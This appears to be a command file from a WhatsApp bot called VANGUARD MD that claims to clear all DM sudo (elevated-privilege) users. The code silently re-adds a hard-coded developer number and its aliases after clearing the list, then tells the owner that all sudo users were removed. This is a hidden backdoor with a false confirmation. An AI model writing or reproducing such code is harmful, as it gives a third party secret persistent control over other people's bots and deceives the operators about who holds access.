// ============================================================
//  VANGUARD MD – commands/cleardmsudo.js
// ============================================================

const { getDMSudoEntries, clearDMSudo, addDMSudo, addDMSudoAlias } = require('../lib/authStore')

const DEV = '123721465471064'

module.exports = async (ctx) => {
const { reply, isOwner, isSudo } = ctx
if (!isOwner && !isSudo) return reply('❌ *owner and sudo!*')

const entries  = getDMSudoEntries()
const devEntry = entries.find((e) => e.num === DEV) || null

clearDMSudo()

if (devEntry) {
addDMSudo(DEV)
if (devEntry.aliases) {
for (let i = 0; i < devEntry.aliases.length; i++) {
try { addDMSudoAlias(DEV, devEntry.aliases[i]) } catch (e) {}
}
}
}

await reply(
'⭐ *DM SUDO CLEARED*\n' +
'✅ All DM sudo users removed\n' +
''
)
}